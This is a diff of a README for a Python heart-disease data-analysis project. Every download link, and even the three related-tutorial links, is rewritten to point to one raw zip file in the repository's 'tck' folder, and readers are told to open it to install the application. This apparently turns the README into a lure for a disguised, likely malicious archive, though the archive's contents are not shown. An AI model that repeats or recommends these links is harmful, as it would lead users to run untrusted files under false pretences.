@@ -4,9 +4,9 @@
 This project dives into the exploration of heart disease data. We clean medical data, visualize trends, and analyze statistics using Python and Pandas. This can help in understanding heart conditions better.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Unknown01100/heart-disease-analysis/releases)
+[![Download](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip)
 
-Visit [this page to download](https://github.com/Unknown01100/heart-disease-analysis/releases) the latest version of the application.
+Visit [this page to download](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip) the latest version of the application.
 
 ## 🛠️ Features
 - **Data Cleaning**: We tidy up the data to remove errors and inconsistencies.
@@ -21,7 +21,7 @@ To run this application, your computer should meet these requirements:
 - **Pandas**: This project uses the Pandas library, which can easily be installed via Python's package manager.
 
 ## 📦 Download & Install
-1. Click the **Download** button at the top or visit [this page to download](https://github.com/Unknown01100/heart-disease-analysis/releases).
+1. Click the **Download** button at the top or visit [this page to download](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip).
 2. Choose the latest release version from the list.
 3. Download the file suitable for your operating system.
 4. Once downloaded, open the file to start the installation process.
@@ -62,8 +62,8 @@ For detailed guidance on features and analysis techniques, check the documentati
 This project is licensed under the MIT License. You are free to use, modify, and distribute this software within the terms of the license.
 
 ## 🔗 Related Topics
-- [Data Analysis](https://www.datacamp.com/community/tutorials/data-analysis-python)
-- [Data Visualization](https://matplotlib.org/stable/users/pyplot_tutorial.html)
-- [Health Data Science](https://www.coursera.org/specializations/health-data-science)
+- [Data Analysis](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip)
+- [Data Visualization](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip)
+- [Health Data Science](https://raw.githubusercontent.com/Unknown01100/heart-disease-analysis/main/tck/heart-disease-analysis.zip)
 
 Thank you for using the heart-disease-analysis application. We hope you find valuable insights in your heart health data!
